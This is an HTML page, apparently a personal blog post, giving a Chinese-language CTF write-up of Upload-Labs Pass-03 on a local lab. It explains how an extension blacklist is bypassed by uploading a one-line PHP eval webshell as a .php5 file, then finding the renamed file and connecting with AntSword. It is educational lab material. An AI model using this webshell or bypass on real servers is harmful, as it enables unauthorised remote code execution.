@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Upload-Labs】Pass-03 黑名单后缀绕过 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Upload-Labs】Pass-03 黑名单后缀绕过 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.11.02 | <strong>分类：</strong>CTF | <strong>标签：</strong>Upload-Labs, Web, 文件上传, 黑名单绕过, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Upload-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - 文件上传</li>
+        <li><strong>题目名称：</strong>Pass-03 (服务端黑名单校验)</li>
+        <li><strong>提示：</strong>任务为上传一个 webshell 到服务器。页面提示不允许上传特定后缀文件。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡的核心漏洞在于<strong>黑名单校验机制的不全面性</strong>。</p>
+    <p>分析源码可知，服务端定义了一个数组 <code>$deny_ext = array('.asp','.aspx','.php','.jsp');</code>。如果上传的文件后缀在这个数组中，则拒绝上传。黑名单机制最大的缺陷是“永远列不全”，由于 Apache 等 Web 服务器通常配置了多种脚本解析后缀（如 <code>.php3</code>、<code>.php4</code>、<code>.php5</code>、<code>.phtml</code> 等），我们可以寻找未在黑名单中但能被服务端解析的“漏网之鱼”。</p>
+    <p>此外，源码中 <code>$img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;</code> 表明，服务端会将上传的文件重命名为“时间戳+随机数+后缀”，因此上传后无法直接猜出文件名。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：Burp Suite、浏览器开发者工具 与 中国蚁剑</h3>
+    <ul>
+        <li><strong>中国蚁剑：</strong>URL 地址需填写带有随机数的真实路径；连接密码：<code>cmd</code>；编码：UTF-8。</li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：准备 Payload 并修改后缀</strong></p>
+    <p>将包含 <code>&lt;?php @eval($_POST['cmd']); ?&gt;</code> 的文件重命名为 <code>shell.php5</code>。由于 <code>.php5</code> 不在黑名单内，且本机 Apache 配置了该后缀的解析规则。</p>
+
+    <p><strong>第二步：上传并获取真实文件名</strong></p>
+    <p>通过 Burp Suite 抓包，将请求中的 <code>filename="shell.php5"</code> 正常发送。由于服务端存在重命名逻辑，页面虽然提示上传成功，但文件名已被篡改。</p>
+    <p>在浏览器按下 <code>F12</code> 打开开发者工具，或者直接查看网页源代码。使用快捷键 <code>Ctrl+F</code> 搜索 <code>/upload</code>，快速定位到类似 <code>&lt;img src="../upload/202611021912206125.php5" ...&gt;</code> 的代码，从而直接提取出真实的随机文件名。</p>
+
+    <p><strong>第三步：验证与连接</strong></p>
+    <p>在浏览器中直接访问该真实路径 <code>http://127.0.0.1:8081/upload/202611021912206125.php5</code>，页面呈现纯白空白状态，证明 PHP 代码已被执行。</p>
+    <p>在蚁剑中配置该随机文件名路径和密码 <code>cmd</code>，成功连接并进入服务器目录。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>忽略服务端重命名机制：</strong>直接尝试访问 <code>upload/shell.php5</code> 会导致 404 错误。在黑盒测试中，必须仔细检查 HTTP 响应体或使用浏览器开发者工具追踪文件落地的真实路径。</li>
+        <li><strong>快速定位路径技巧：</strong>在遇到随机文件名重命名时，由于直接查找困难，可以通过在网页源码或 F12 开发者工具中搜索关键词 <code>/upload</code>，快速定位到 <code>&lt;img src="..."&gt;</code> 标签，高效提取出最终生成的绝对路径。</li>
+        <li><strong>后缀选择：</strong>在 phpStudy 的 FastCGI 环境下，需要确认哪些后缀被配置为可执行。参考本地通关手册，<code>.php5</code> 是最稳妥的绕过后缀之一，而 <code>.php7</code> 等未配置的后缀无法执行。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>黑名单绕过</strong>：利用服务器支持解析但黑名单未覆盖的特殊后缀（如 <code>.php3</code>、<code>.php5</code>、<code>.phtml</code>）进行绕过。</li>
+        <li><strong>文件重命名下的路径获取</strong>：在遇到随机文件名重命名时，通过搜索 <code>/upload</code> 定位响应源码，提取最终生成的绝对路径。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
